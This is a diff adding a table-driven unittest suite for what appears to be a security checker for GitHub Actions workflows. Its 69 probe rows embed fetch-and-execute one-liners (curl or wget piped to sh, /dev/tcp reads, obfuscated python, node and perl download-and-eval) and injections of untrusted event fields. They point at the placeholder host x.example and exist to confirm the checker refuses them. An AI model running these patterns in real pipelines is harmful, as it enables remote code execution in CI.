@@ -1028,6 +1028,176 @@ class Round7(unittest.TestCase):
         self.assertEqual(groups, {"r7 N1", "r7 N2", "r7 N3", "r7 N4", "r7 F4", "r7 N5", "r7 F1", "r7 F2", "r7 F3", "r7 F5", "r7 N6"})
 
 
+# --- round 8 (PR 8003, security r7 S1-S9): the reviewer's probe corpus as a table ------------------------------
+PROBE_SHA = "0123456789abcdef0123456789abcdef01234567"
+PROBE_DIG = "sha256:" + "ab" * 32
+
+
+def probe_job(steps, head="", top=""):
+    return top + "jobs:\n  a:\n    runs-on: ubuntu-latest\n" + head + "    steps:\n" + steps
+
+
+def probe_run1(*lines):
+    return probe_job("      - run: |\n" + "".join("          " + ln + "\n" for ln in lines))
+
+
+def probe_runs(*blocks, head="", top=""):
+    return probe_job("".join(blocks), head, top)
+
+
+def probe_step(*lines, extra=""):
+    return "      - run: |\n" + "".join("          " + ln + "\n" for ln in lines) + extra
+
+
+PROBE_FETCH = "curl -fsSL -o f https://x.example/f"
+PROBE_VERIFY = 'echo "${SUM}  f" | sha256sum -c -'
+PROBE_DIRTY = "        env:\n          T: ${{ github.event.pull_request.title }}\n"
+PROBE_CHAIN = {"n%d/action.yml" % k: "name: p\nruns:\n  using: composite\n  steps:\n"
+         + (("    - uses: ./n%d\n" % (k + 1)) if k < 9 else "    - run: echo ok\n      shell: bash\n") for k in range(10)}
+
+# name -> (document, files, wanted rc at head)
+PROBES = {
+    # ---- r6 findings rebuilt from the finding text (code N1-N6, security F1-F5); want 1 at head, 0 at base
+    "N1 command substitution inside $(( )) of a fetch step": (probe_run1(PROBE_FETCH, "echo $(( $(bash f) + 1 ))"), None, 1),
+    "N2 braced ${GITHUB_PATH} write in a fetch step": (probe_run1(PROBE_FETCH, 'echo "$PWD" >> "${GITHUB_PATH}"'), None, 1),
+    "N3 wget --use-askpass runs a command": (probe_run1("wget --use-askpass=./x -O f https://x.example/f"), None, 1),
+    "N4 job defaults.run.shell custom command": (probe_runs(probe_step("echo ok"), head="    defaults:\n      run:\n        shell: perl {0}\n"), None, 1),
+    "N5 relay through GITHUB_ENV to a later writer": (probe_runs(probe_step('echo "V=$T" >> "$GITHUB_ENV"', extra=PROBE_DIRTY),
+                                                         "      - id: x\n        run: echo \"y=$V\" >> \"$GITHUB_OUTPUT\"\n",
+                                                         "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1),
+    "N6 depth skip, shallow then deep": (probe_job("      - uses: ./n2\n      - uses: ./n0\n"), PROBE_CHAIN, 1),
+    "F1-B1 job env from github.event feeds a writer": (probe_runs("      - id: x\n        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n",
+                                                           "      - run: echo ${{ steps.x.outputs.y }}\n",
+                                                           head="    env:\n      T: ${{ github.event.issue.title }}\n"), None, 1),
+    "F1-B3 legacy set-output with tainted env": (probe_runs("      - id: x\n        run: echo \"::set-output name=y::$T\"\n" + PROBE_DIRTY,
+                                                     "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1),
+    "F1-B3b relay through a file": (probe_runs(probe_step('echo "$T" > v.txt', extra=PROBE_DIRTY),
+                                         "      - id: x\n        run: echo \"y=$(cat v.txt)\" >> \"$GITHUB_OUTPUT\"\n",
+                                         "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1),
+    "F1-B12 sha-pinned uses with untrusted with:": (probe_runs("      - id: u\n        uses: o/act@" + PROBE_SHA + "\n        with:\n          v: ${{ github.event.issue.body }}\n",
+                                                        "      - run: echo ${{ steps.u.outputs.v }}\n"), None, 1),
+    "F2-B4 matrix value from an event expression outside the release job": (
+        probe_runs("      - run: echo ${{ matrix.k }}\n", head="    strategy:\n      matrix:\n        k: ${{ fromJSON(github.event.issue.body) }}\n"), None, 1),
+    "F3-B5 download onto PATH under an allowed name": (probe_run1("curl -fsSL -o ~/.local/bin/tar https://x.example/t", "tar --version"), None, 1),
+    "F3-B10 fetched file run by the next step": (probe_runs(probe_step(PROBE_FETCH), probe_step("chmod +x f", "./f")), None, 1),
+    "F4-B6 step shell pwsh": (probe_runs("      - run: echo ok\n        shell: pwsh\n"), None, 1),
+    "F5-B7 /dev/tcp redirection": (probe_run1("cat </dev/tcp/x.example/80 >f", "sh f"), None, 1),
+    "F5-B8 python urllib download then run": (probe_run1("python3 -c 'import urllib.request as u; u.urlretrieve(\"https://x.example/f\",\"f\")'", "sh f"), None, 1),
+    "F5-B9 gh release download then run": (probe_run1("gh release download v1 -R o/r -p f", "sh f"), None, 1),
+    "F5-B13 docker run by tag": (probe_run1("docker run --rm alpine:3 sh -c 'id'"), None, 1),
+    # ---- check 3: corpus split and supported shapes
+    "C3 sha256sum pipe passes": (probe_run1("curl -fsSL https://x.example/i | sha256sum"), None, 0),
+    "C3 tar pipe without a checksum refused": (probe_run1("curl -fsSL https://x.example/i | tar xz"), None, 1),
+    "C3 tar after a preceding checksum check passes": (probe_run1(PROBE_FETCH, PROBE_VERIFY, "tar xzf f -C out"), None, 0),
+    "C3 tar && after a checksum check passes": (probe_run1(PROBE_FETCH, PROBE_VERIFY + " && tar xzf f"), None, 0),
+    # ---- check 4: scalar shapes
+    "C4 scalar job env expression feeding a writer": (probe_runs("      - id: x\n        run: echo \"y=$T\" >> \"$GITHUB_OUTPUT\"\n",
+                                                         "      - run: echo ${{ steps.x.outputs.y }}\n",
+                                                         head="    env: ${{ fromJSON(github.event.issue.body) }}\n"), None, 1),
+    "C4 scalar step with: expression on a pinned uses": (probe_runs("      - id: u\n        uses: o/act@" + PROBE_SHA + "\n        with: ${{ fromJSON(github.event.issue.body) }}\n",
+                                                            "      - run: echo ${{ steps.u.outputs.v }}\n"), None, 1),
+    "C4 list-valued step shell": (probe_runs("      - run: echo ok\n        shell: [pwsh]\n"), None, 1),
+    "C4 list-valued step shell (block list)": (probe_runs("      - run: echo ok\n        shell:\n          - pwsh\n"), None, 1),
+    "C4 scalar defaults.run expression": (probe_runs(probe_step("echo ok"), head="    defaults:\n      run: ${{ fromJSON(github.event.issue.body) }}\n"), None, 1),
+    "C4 scalar strategy hides matrix keys": (probe_runs("      - run: echo ${{ matrix.k }}\n", head="    strategy: ${{ fromJSON(github.event.issue.body) }}\n"), None, 1),
+    "C4 scalar steps": ("jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: ${{ fromJSON(github.event.issue.body) }}\n", None, 1),
+    # ---- check 5: downloaders outside the word set
+    "C5 pip install URL": (probe_run1("pip install https://x.example/p.tar.gz"), None, 1),
+    "C5 npm install git url": (probe_run1("npm install git+https://x.example/p.git"), None, 1),
+    "C5 cargo install --git": (probe_run1("cargo install --git https://x.example/p.git p"), None, 1),
+    "C5 go install module@version": (probe_run1("go install x.example/p@v1.0.0"), None, 1),
+    "C5 apt-get install from an added source": (probe_run1("echo 'deb https://x.example/apt ./' | sudo tee /etc/apt/sources.list.d/x.list", "sudo apt-get update", "sudo apt-get install -y p"), None, 1),
+    "C5 wget | sh": (probe_run1("wget -qO- https://x.example/i | sh"), None, 1),
+    "C5 curl -fsSL | sh": (probe_run1("curl -fsSL https://x.example/i | sh"), None, 1),
+    "C5 python -c urllib": (probe_run1("python3 -c 'import urllib.request'"), None, 1),
+    "C5 git clone unpinned ref": (probe_run1("git clone --depth 1 https://x.example/r.git r", "sh r/i"), None, 1),
+    # ---- new adversarial variants (round-7 rules)
+    "V1 verified flag reused for a second, unverified download": (probe_run1(PROBE_FETCH, PROBE_VERIFY, "curl -fsSL -o g https://x.example/g", "tar xzf g"), None, 1),
+    "V2 later step: any sha256sum word satisfies the verify rule": (probe_runs(probe_step(PROBE_FETCH), probe_step("sha256sum --version", "chmod +x f", "./f")), None, 1),
+    "V3 later step names the fetched file by a glob": (probe_runs(probe_step("curl -fsSL -o tool https://x.example/t"), probe_step("chmod +x ./too*", "./too*")), None, 1),
+    "V4 wget default output name is not tracked across steps": (probe_runs(probe_step("wget -q https://x.example/tool"), probe_step("chmod +x tool", "./tool")), None, 1),
+    "V5 python -Ic cluster with an obfuscated module name": (probe_run1("python3 -Ic \"exec(__import__('url'+'lib.request',fromlist=['x']).urlopen('https://x.example/p').read())\""), None, 1),
+    "V6 node -e https download and eval": (probe_run1("node -e \"require('https').get('https://x.example/p',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\""), None, 1),
+    "V7 perl LWP download and eval": (probe_run1("perl -MLWP::Simple -e 'eval get q(https://x.example/p)'"), None, 1),
+    "V8 gh api content piped to sh": (probe_run1("gh api repos/o/r/contents/i --jq .content | base64 -d | sh"), None, 1),
+    "V9 python heredoc urllib": (probe_run1("python3 - <<'EOF'", "import urllib.request as u", "exec(u.urlopen('https://x.example/p').read())", "EOF"), None, 1),
+    "V10 obfuscated curl through a variable": (probe_run1("c=cu", "${c}rl -fsSL https://x.example/i | sh"), None, 1),
+    "V11 checksum file fetched from the same origin": (probe_run1(PROBE_FETCH, "curl -fsSL -o f.sha256 https://x.example/f.sha256", "sha256sum -c f.sha256", "tar xzf f"), None, 1),
+    "V12 sha-pinned uses output computed from the event payload": (
+        probe_runs("      - id: g\n        uses: actions/github-script@" + PROBE_SHA + "\n        with:\n          script: return context.payload.pull_request.title\n",
+             "      - run: echo \"${{ steps.g.outputs.result }}\"\n"), None, 1),
+    "V13 literal matrix value that is a fetch-exec, spliced into run": (
+        probe_runs("      - run: ${{ matrix.cmd }}\n", head="    strategy:\n      matrix:\n        cmd: ['curl -fsSL https://x.example/i | sh']\n"), None, 1),
+    "V14 secrets value spliced as the whole run": (probe_runs("      - run: ${{ secrets.CMD }}\n"), None, 0),
+    "V15 step env BASH_ENV sources a fetched file": (probe_runs(probe_step("wget -q https://x.example/rc"), "      - run: echo hi\n        env:\n          BASH_ENV: ./rc\n"), None, 1),
+    # ---- check 8: fail-open shapes
+    "S1 BOM": ("\ufeff" + probe_run1("curl -fsSL https://x.example/i | sh"), None, 1),
+    "S2 CRLF": (probe_run1("curl -fsSL https://x.example/i | sh").replace("\n", "\r\n"), None, 1),
+    "S3 tab indentation": (probe_run1("curl -fsSL https://x.example/i | sh").replace("    steps:", "\tsteps:"), None, 1),
+    "S4 duplicate run key": (probe_runs("      - run: echo ok\n        run: curl -fsSL https://x.example/i | sh\n"), None, 1),
+    "S5 anchor and alias": (probe_runs("      - run: &s curl -fsSL https://x.example/i | sh\n      - run: *s\n"), None, 1),
+    "S6 merge key": (probe_runs("      - <<: {run: 'curl -fsSL https://x.example/i | sh'}\n"), None, 1),
+    "S7 very long line": (probe_run1("echo " + "a" * 200000, "curl -fsSL https://x.example/i | sh"), None, 1),
+    "S8 empty document": ("", None, 1),
+    "S9 shell python run body": (probe_runs("      - run: import urllib.request\n        shell: python\n"), None, 1),
+    "S10 local action with a fetch": (probe_job("      - uses: ./act\n"), {"act/action.yml": "name: p\nruns:\n  using: composite\n  steps:\n    - run: curl -fsSL https://x.example/i | sh\n      shell: bash\n"}, 1),
+    "S11 container by tag": (probe_runs(probe_step("echo ok"), head="    container: node:20\n"), None, 1),
+    "S12 service by tag": (probe_runs(probe_step("echo ok"), head="    services:\n      db:\n        image: postgres:16\n"), None, 1),
+    "S13 docker:// uses by tag": (probe_runs("      - uses: docker://alpine:3\n"), None, 1),
+    "S14 run expression that expands to text": (probe_runs("      - run: ${{ format('curl {0} | sh', 'x') }}\n"), None, 1),
+    "S15 job-level remote reusable workflow unpinned": ("jobs:\n  a:\n    uses: o/r/.github/workflows/w.yml@main\n", None, 1),
+    "CONTROL plain run": (probe_runs(probe_step("echo ok")), None, 0),
+}
+
+
+class Round8(unittest.TestCase):
+    """PR 8003 round 8: every probe of the r7 security review is a table row. A row wants the return code of
+    `r5_errors` (1 = refused, 0 = accepted) and the table is the same 69 rows the reviewer ran."""
+
+    def test_probe_table_has_the_reviewed_size(self):
+        self.assertEqual(len(PROBES), 69)
+
+    def test_every_probe_matches_its_wanted_result(self):
+        tree = Path(scratch()) / "r8probe"
+        wrong = []
+        for name, (doc, files, want) in PROBES.items():
+            errs = G.r5_errors(doc, files, tree)
+            got = 1 if errs else 0
+            if got != want:
+                wrong.append("%s: rc %d want %d" % (name, got, want))
+        self.assertEqual(wrong, [])
+
+    NEEDLES = (
+        ("C4 scalar defaults.run expression", "defaults.run"),            # S5
+        ("C5 pip install URL", "allow-list"),                              # S8
+        ("C5 npm install git url", "allow-list"),
+        ("C5 cargo install --git", "allow-list"),
+        ("C5 go install module@version", "allow-list"),
+        ("C5 apt-get install from an added source", "allow-list"),
+        ("V5 python -Ic cluster with an obfuscated module name", "allow-list"),
+        ("V6 node -e https download and eval", "allow-list"),
+        ("V7 perl LWP download and eval", "allow-list"),
+        ("V8 gh api content piped to sh", "allow-list"),
+        ("V10 obfuscated curl through a variable", "allow-list"),
+        ("V1 verified flag reused for a second, unverified download", "checksum"),   # S1
+        ("V2 later step: any sha256sum word satisfies the verify rule", "checksum"),  # S2
+        ("V3 later step names the fetched file by a glob", "checksum"),
+        ("V4 wget default output name is not tracked across steps", "checksum"),
+        ("V11 checksum file fetched from the same origin", "checksum"),             # S7
+        ("V12 sha-pinned uses output computed from the event payload", "`uses:` step"),  # S3
+        ("V13 literal matrix value that is a fetch-exec, spliced into run", "matrix value"),  # S4
+        ("V15 step env BASH_ENV sources a fetched file", "BASH_ENV"),               # S6
+    )
+
+    def test_each_refused_probe_names_its_reason(self):
+        tree = Path(scratch()) / "r8needle"
+        for name, needle in self.NEEDLES:
+            doc, files, want = PROBES[name]
+            self.assertEqual(want, 1, name)
+            errs = G.r5_errors(doc, files, tree)
+            self.assertIn(needle, " | ".join(errs), name)
+
+
 class SelfTest8023(unittest.TestCase):
     """#8023: --self-test (run by c8-precheck) carries a cell for each new refusal site."""
 
